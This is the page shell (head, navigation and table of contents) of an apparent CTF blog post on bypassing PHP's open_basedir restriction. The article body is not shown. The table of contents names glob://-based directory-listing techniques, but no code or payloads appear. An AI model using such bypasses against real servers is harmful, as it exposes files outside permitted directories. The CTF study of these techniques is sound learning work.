<!DOCTYPE html>

<html class="scroll-smooth" data-auto-appearance="true" data-default-appearance="dark" dir="ltr" lang="en"><head>
<meta charset="utf-8"/>
<meta content="en" http-equiv="content-language"/>
<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
<meta content="ie=edge" http-equiv="X-UA-Compatible"/>
<meta name="theme-color"/>
<title>Open_basedir绕过 · Delete's blog</title>
<meta content="Open_basedir绕过 · Delete's blog" name="title"/>
<meta content="A CTFer find something funny" name="description"/>
<meta content="PHP,bypass," name="keywords"/>
<link href="https://ml-hacker.github.io/posts/open_basedir%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" rel="canonical"/>
<link href="/css/main.bundle.min.8ae4b478ff7329e5aeb2ee129da2ea38b7c9ed6222bbecaf273840388a43b9c682ac49e60bc8b5f7cd9d752f6fd44ae086deeb5ae241bbb439beb9fa8424fe6a.css" rel="stylesheet" type="text/css"/>
<script src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js" type="text/javascript"></script>
<script data-copied="Copied" data-copy="Copy" defer="" id="script-bundle" src="/js/main.bundle.min.458a544dcb3823846b3223eb7edab5104f1d9b99925cbbd876092b40422e5086033868b32c3da5c471356605c4cc897e765a267001ee04ed5acfad7a799764cb.js" type="text/javascript"></script>
<script src="/lib/zoom/zoom.min.umd.b4b722fcb5d42f34f52b30a92f3521b69f403ca9d96d0d6179eb537cb870f5d83fdf1fe836688d95d5c99fefbda4170487711006e56051fa67ea00da10521721.js"></script>
<link href="/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
<link href="/favicon-32x32.png" rel="icon" sizes="32x32" type="image/png"/>
<link href="/favicon-16x16.png" rel="icon" sizes="16x16" type="image/png"/>
<link href="/site.webmanifest" rel="manifest"/>
<meta content="https://ml-hacker.github.io/posts/open_basedir%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/" property="og:url"/>
<meta content="Delete's blog" property="og:site_name"/>
<meta content="Open_basedir绕过" property="og:title"/>
<meta content="A CTFer find something funny" property="og:description"/>
<meta content="en" property="og:locale"/>
<meta content="article" property="og:type"/>
<meta content="posts" property="article:section"/>
<meta content="2024-04-14T14:34:26+08:00" property="article:published_time"/>
<meta content="2024-04-14T14:34:26+08:00" property="article:modified_time"/>
<meta content="PHP" property="article:tag"/>
<meta content="Bypass" property="article:tag"/>
<meta content="summary" name="twitter:card"/>
<meta content="Open_basedir绕过" name="twitter:title"/>
<meta content="A CTFer find something funny" name="twitter:description"/>
<script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "Open_basedir绕过",
    "headline": "Open_basedir绕过",
    
    
    "inLanguage": "en",
    "url" : "https:\/\/ml-hacker.github.io\/posts\/open_basedir%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0\/",
    "author" : {
      "@type": "Person",
      "name": "Delete\u0027s blog"
    },
    "copyrightYear": "2024",
    "dateCreated": "2024-04-14T14:34:26\u002b08:00",
    "datePublished": "2024-04-14T14:34:26\u002b08:00",
    
    "dateModified": "2024-04-14T14:34:26\u002b08:00",
    
    "keywords": ["PHP","bypass"],
    
    "mainEntityOfPage": "true",
    "wordCount": "849"
  }]
  </script>
<meta content="Delete's blog" name="author"/>
<link href="delete@student.gdufe.edu.cn" rel="me"/>
<link href="https://github.com/ML-hacker" rel="me"/>
<script src="/lib/jquery/jquery.slim.min.03cb160e3cfdb2667a2e2c80d283bebcf63ff8bbc4b629c9ab2babf6fae1d0c07ad470edae783efa4fabda2ac01c58d60e63b98b3c336be8208460f08f4354f5.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
<script>

    const firebaseConfig = {
      apiKey: "AIzaSyCttX9CvLt5q9ivhSRRldSgNxB4loLvwSo",
      authDomain: "AIzaSyCttX9CvLt5q9ivhSRRldSgNxB4loLvwSo",
      projectId: "like-6851a",
      storageBucket: "like-6851a.firebasestorage.app",
      messagingSenderId: "663302573870",
      appId: "1:663302573870:web:db2818ca9e5ea64c41f4bf",
      measurementId: "G-FNF9MJ1961"
    };

    var app = firebase.initializeApp(firebaseConfig);
    var db = firebase.firestore();
    var auth = firebase.auth();

  </script>
</head>
<body class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
<div class="absolute flex self-center" id="the-top">
<a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600" href="#main-content">
<span class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">↓</span>
        Skip to main content
      </a>
</div>
<div class="min-h-[148px]"></div>
<div class="fixed inset-x-0 pl-[24px] pr-[24px] z-100">
<div class="absolute opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom bg-neutral dark:bg-neutral-800" id="menu-blur"></div>
<div class="relative max-w-[64rem] ml-auto mr-auto">
<div class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
<div class="flex flex-1 items-center justify-between">
<nav class="flex space-x-3">
<a class="text-base font-medium text-gray-500 hover:text-gray-900" href="/">
          Delete’s blog
        </a>
</nav>
<nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
<a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" href="/">
<span class="mr-1">
<span class="relative block icon"><svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg">
<path d="M0 32v448h448V32H0zm21.2 197.2H21c.1-.1.2-.3.3-.4 0 .1 0 .3-.1.4zm218 53.9V384h-31.4V281.3L128 128h37.3c52.5 98.3 49.2 101.2 59.3 125.6 12.3-27 5.8-24.4 60.6-125.6H320l-80.8 155.1z" fill="currentColor"></path></svg></span>
</span>
<p class="text-base font-medium" title="Delete's blog">
    Home
  </p>
</a>
<a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" href="/posts/">
<span class="mr-1">
<span class="relative block icon"><svg viewbox="0 0 576 512" xmlns="http://www.w3.org/2000/svg">
<path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z" fill="currentColor"></path></svg></span>
</span>
<p class="text-base font-medium" title="Posts">
    Post
  </p>
</a>
<a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" href="/friends/">
<span class="mr-1">
<span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M48 64C21.5 64 0 85.5 0 112c0 15.1 7.1 29.3 19.2 38.4L236.8 313.6c11.4 8.5 27 8.5 38.4 0L492.8 150.4c12.1-9.1 19.2-23.3 19.2-38.4c0-26.5-21.5-48-48-48H48zM0 176V384c0 35.3 28.7 64 64 64H448c35.3 0 64-28.7 64-64V176L294.4 339.2c-22.8 17.1-54 17.1-76.8 0L0 176z" fill="currentColor"></path></svg></span>
</span>
<p class="text-base font-medium" title="友链">
    Friend
  </p>
</a>
<a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" href="/about/">
<span class="mr-1">
<span class="relative block icon"><svg viewbox="0 0 384 512" xmlns="http://www.w3.org/2000/svg">
<path d="M50.8 452.1L19.2 477.4c-2.1 1.7-4.7 2.6-7.4 2.6C5.3 480 0 474.7 0 468.2V192C0 86 86 0 192 0S384 86 384 192V468.2c0 6.5-5.3 11.8-11.8 11.8c-2.7 0-5.3-.9-7.4-2.6l-31.6-25.3c-3.3-2.7-7.5-4.1-11.8-4.1c-5.9 0-11.5 2.8-15 7.5l-37.6 50.1c-3 4-7.8 6.4-12.8 6.4s-9.8-2.4-12.8-6.4l-38.4-51.2c-3-4-7.8-6.4-12.8-6.4s-9.8 2.4-12.8 6.4l-38.4 51.2c-3 4-7.8 6.4-12.8 6.4s-9.8-2.4-12.8-6.4L77.6 455.5c-3.6-4.7-9.1-7.5-15-7.5c-4.3 0-8.4 1.5-11.7 4.1zM160 192c0-17.7-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32s32-14.3 32-32zm96 32c17.7 0 32-14.3 32-32s-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32z" fill="currentColor"></path></svg></span>
</span>
<p class="text-base font-medium" title="ABOUT MEEE">
    About
  </p>
</a>
<button aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400" id="search-button" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" class="svg-inline--fa fa-search fa-w-16" data-icon="search" data-prefix="fas" focusable="false" role="img" viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z" fill="currentColor"></path></svg>
</span>
</button>
<div class="flex items-center">
<button aria-label="Dark mode switcher" class="text-base hover:text-primary-600 dark:hover:text-primary-400" id="appearance-switcher" type="button">
<div class="flex items-center justify-center dark:hidden">
<span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z" fill="currentColor"></path></svg>
</span>
</div>
<div class="items-center justify-center hidden dark:flex">
<span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z" fill="currentColor"></path></svg>
</span>
</div>
</button>
</div>
</nav>
<div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
<span></span>
<button aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400" id="search-button-mobile" title="Search (/)">
<span class="relative block icon"><svg aria-hidden="true" class="svg-inline--fa fa-search fa-w-16" data-icon="search" data-prefix="fas" focusable="false" role="img" viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z" fill="currentColor"></path></svg>
</span>
</button>
<button aria-label="Dark mode switcher" class="text-base hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-1 rtl:ml-1" id="appearance-switcher-mobile" type="button">
<div class="flex items-center justify-center dark:hidden">
<span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z" fill="currentColor"></path></svg>
</span>
</div>
<div class="items-center justify-center hidden dark:flex">
<span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z" fill="currentColor"></path></svg>
</span>
</div>
</button>
</div>
</div>
<div class="-my-2 md:hidden">
<div class="block" id="menu-button">
<div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
<span class="relative block icon"><svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg"><path d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z" fill="currentColor"></path></svg>
</span>
</div>
<div class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]" id="menu-wrapper">
<ul class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">
<li id="menu-close-button">
<span class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
<span class="relative block icon"><svg viewbox="0 0 320 512" xmlns="http://www.w3.org/2000/svg"><path d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z" fill="currentColor"></path></svg>
</span>
</span>
</li>
<li class="mt-1">
<a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" href="/">
<div class="mr-2">
<span class="relative block icon"><svg viewbox="0 0 448 512" xmlns="http://www.w3.org/2000/svg">
<path d="M0 32v448h448V32H0zm21.2 197.2H21c.1-.1.2-.3.3-.4 0 .1 0 .3-.1.4zm218 53.9V384h-31.4V281.3L128 128h37.3c52.5 98.3 49.2 101.2 59.3 125.6 12.3-27 5.8-24.4 60.6-125.6H320l-80.8 155.1z" fill="currentColor"></path></svg></span>
</div>
<p class="text-bg font-bg" title="Delete's blog">
      Home
    </p>
</a>
</li>
<li class="mt-1">
<a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" href="/posts/">
<div class="mr-2">
<span class="relative block icon"><svg viewbox="0 0 576 512" xmlns="http://www.w3.org/2000/svg">
<path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z" fill="currentColor"></path></svg></span>
</div>
<p class="text-bg font-bg" title="Posts">
      Post
    </p>
</a>
</li>
<li class="mt-1">
<a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" href="/friends/">
<div class="mr-2">
<span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M48 64C21.5 64 0 85.5 0 112c0 15.1 7.1 29.3 19.2 38.4L236.8 313.6c11.4 8.5 27 8.5 38.4 0L492.8 150.4c12.1-9.1 19.2-23.3 19.2-38.4c0-26.5-21.5-48-48-48H48zM0 176V384c0 35.3 28.7 64 64 64H448c35.3 0 64-28.7 64-64V176L294.4 339.2c-22.8 17.1-54 17.1-76.8 0L0 176z" fill="currentColor"></path></svg></span>
</div>
<p class="text-bg font-bg" title="友链">
      Friend
    </p>
</a>
</li>
<li class="mt-1">
<a class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400" href="/about/">
<div class="mr-2">
<span class="relative block icon"><svg viewbox="0 0 384 512" xmlns="http://www.w3.org/2000/svg">
<path d="M50.8 452.1L19.2 477.4c-2.1 1.7-4.7 2.6-7.4 2.6C5.3 480 0 474.7 0 468.2V192C0 86 86 0 192 0S384 86 384 192V468.2c0 6.5-5.3 11.8-11.8 11.8c-2.7 0-5.3-.9-7.4-2.6l-31.6-25.3c-3.3-2.7-7.5-4.1-11.8-4.1c-5.9 0-11.5 2.8-15 7.5l-37.6 50.1c-3 4-7.8 6.4-12.8 6.4s-9.8-2.4-12.8-6.4l-38.4-51.2c-3-4-7.8-6.4-12.8-6.4s-9.8 2.4-12.8 6.4l-38.4 51.2c-3 4-7.8 6.4-12.8 6.4s-9.8-2.4-12.8-6.4L77.6 455.5c-3.6-4.7-9.1-7.5-15-7.5c-4.3 0-8.4 1.5-11.7 4.1zM160 192c0-17.7-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32s32-14.3 32-32zm96 32c17.7 0 32-14.3 32-32s-14.3-32-32-32s-32 14.3-32 32s14.3 32 32 32z" fill="currentColor"></path></svg></span>
</div>
<p class="text-bg font-bg" title="ABOUT MEEE">
      About
    </p>
</a>
</li>
</ul>
</div>
</div>
</div>
</div>
<script>
    (function () {
      var $mainmenu = $(".main-menu");
      var path = window.location.pathname;
      $mainmenu.find('a[href="' + path + '"]').each(function (i, e) {
        $(e).children("p").addClass("active");
      });
    })();
  </script>
</div>
</div>
<script data-target-id="menu-blur" src="/js/background-blur.min.7b2acf8ec14c2f4aab9f3b34610bed8d54fba2c3c7e5519005377ee7af9e4d20ea94eae2166561011ec8de5ac41fb35f211121624794f91548190da68eef7545.js" type="text/javascript"></script>
<div class="relative flex flex-col grow">
<main class="grow" id="main-content">
<article>
<div class="w-full rounded-md h-36 md:h-56 lg:h-72 single_hero_basic nozoom" style="background-image:url(/img/featured.svg);"></div>
<div class="single_hero_background nozoom fixed inset-x-0 top-0 h-[800px]">
<img alt="Background Image" class="absolute inset-0 h-full w-full object-cover" id="background-image-main" src="/img/background.svg"/>
<div class="from-neutral absolute inset-0 bg-gradient-to-t to-transparent mix-blend-normal dark:from-neutral-800"></div>
<div class="from-neutral to-neutral absolute inset-0 bg-gradient-to-t opacity-30 mix-blend-normal dark:from-neutral-800 dark:to-neutral-800 dark:opacity-60"></div>
</div>
<div class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl" id="background-blur"></div>
<script data-image-id="background-image-main" data-image-url="/img/background.svg" data-target-id="background-blur" src="/js/background-blur.min.7b2acf8ec14c2f4aab9f3b34610bed8d54fba2c3c7e5519005377ee7af9e4d20ea94eae2166561011ec8de5ac41fb35f211121624794f91548190da68eef7545.js" type="text/javascript"></script>
<header class="mt-5 max-w-prose" id="single_header">
<h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        Open_basedir绕过
      </h1>
<div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
<div class="flex flex-row flex-wrap items-center">
<time datetime="2024-04-14T14:34:26+08:00">14 April 2024</time><span class="px-2 text-primary-500">·</span><span>849 words</span><span class="px-2 text-primary-500">·</span><span title="Reading time">4 mins</span><span class="px-2 text-primary-500">·</span><span>
<span class="animate-pulse inline-block text-transparent max-h-3 rounded-full -mt-[2px] align-middle bg-neutral-300 dark:bg-neutral-400" id="views_posts\Open_basedir绕过学习.md" title="views">loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewbox="0 0 576 512" xmlns="http://www.w3.org/2000/svg">
<path d="M288 32c-80.8 0-145.5 36.8-192.6 80.6C48.6 156 17.3 208 2.5 243.7c-3.3 7.9-3.3 16.7 0 24.6C17.3 304 48.6 356 95.4 399.4C142.5 443.2 207.2 480 288 480s145.5-36.8 192.6-80.6c46.8-43.5 78.1-95.4 93-131.1c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C433.5 68.8 368.8 32 288 32zM432 256c0 79.5-64.5 144-144 144s-144-64.5-144-144s64.5-144 144-144s144 64.5 144 144zM288 192c0 35.3-28.7 64-64 64c-11.5 0-22.3-3-31.6-8.4c-.2 2.8-.4 5.5-.4 8.4c0 53 43 96 96 96s96-43 96-96s-43-96-96-96c-2.8 0-5.6 .1-8.4 .4c5.3 9.3 8.4 20.1 8.4 31.6z" fill="currentColor"></path></svg></span></span>
</span>
<span class="px-2 text-primary-500">·</span><span>
<span class="animate-pulse inline-block text-transparent max-h-3 rounded-full -mt-[2px] align-middle bg-neutral-300 dark:bg-neutral-400" id="likes_posts\Open_basedir绕过学习.md" title="likes">loading</span>
<span class="inline-block align-text-bottom"><span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
<path d="M47.6 300.4L228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6 0 115.2 0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z" fill="currentColor"></path></svg></span></span>
</span>
<span class="px-2 text-primary-500">·</span><span>
<button class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400" id="button_likes">
<span class="inline-block align-text-bottom hidden" id="button_likes_heart"><span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
<path d="M47.6 300.4L228.3 469.1c7.5 7 17.4 10.9 27.7 10.9s20.2-3.9 27.7-10.9L464.4 300.4c30.4-28.3 47.6-68 47.6-109.5v-5.8c0-69.9-50.5-129.5-119.4-141C347 36.5 300.6 51.4 268 84L256 96 244 84c-32.6-32.6-79-47.5-124.6-39.9C50.5 55.6 0 115.2 0 185.1v5.8c0 41.5 17.2 81.2 47.6 109.5z" fill="currentColor"></path></svg></span>
</span>
<span class="inline-block align-text-bottom" id="button_likes_emtpty_heart"><span class="relative block icon"><svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
<path d="M244 84L255.1 96L267.1 84.02C300.6 51.37 347 36.51 392.6 44.1C461.5 55.58 512 115.2 512 185.1V190.9C512 232.4 494.8 272.1 464.4 300.4L283.7 469.1C276.2 476.1 266.3 480 256 480C245.7 480 235.8 476.1 228.3 469.1L47.59 300.4C17.23 272.1 0 232.4 0 190.9V185.1C0 115.2 50.52 55.58 119.4 44.1C164.1 36.51 211.4 51.37 244 84C243.1 84 244 84.01 244 84L244 84zM255.1 163.9L210.1 117.1C188.4 96.28 157.6 86.4 127.3 91.44C81.55 99.07 48 138.7 48 185.1V190.9C48 219.1 59.71 246.1 80.34 265.3L256 429.3L431.7 265.3C452.3 246.1 464 219.1 464 190.9V185.1C464 138.7 430.4 99.07 384.7 91.44C354.4 86.4 323.6 96.28 301.9 117.1L255.1 163.9z" fill="currentColor"></path></svg></span></span>
<span id="button_likes_text"> Like</span>
</button>
</span>
</div>
<div class="flex flex-row flex-wrap items-center">
<a class="relative mt-[0.5rem] mr-2" href="/categories/ctf/"><span class="flex cursor-pointer">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    CTF
  </span>
</span>
</a>
<a class="relative mt-[0.5rem] mr-2" href="/tags/php/"><span class="flex cursor-pointer">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    PHP
  </span>
</span>
</a>
<a class="relative mt-[0.5rem] mr-2" href="/tags/bypass/"><span class="flex cursor-pointer">
<span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Bypass
  </span>
</span>
</a>
</div>
</div>
</header>
<section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
<div class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
<div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-[140px]">
<details class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block" id="TOCView" open="">
<summary class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
<div class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
<nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#simple-globe">Simple Globe://</a></li>
<li><a href="#diretorylterator--globe">Diretorylterator + Globe://</a></li>
<li><a href="#opendirreaddirglob">opendir()+readdir()+glob://</a></li>
<li><a href="#scandirglob">scandir()+glob://</a></li>
</ul>
</li>
</ul>
</nav>
</div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
<summary class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
<div class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
<nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#simple-globe">Simple Globe://</a></li>
<li><a href="#diretorylterator--globe">Diretorylterator + Globe://</a></li>
<li><a href="#opendirreaddirglob">opendir()+readdir()+glob://</a></li>
<li><a href="#scandirglob">scandir()+glob://</a></li>
</ul>
</li>
</ul>
</nav>
</div>
</details>
<script>
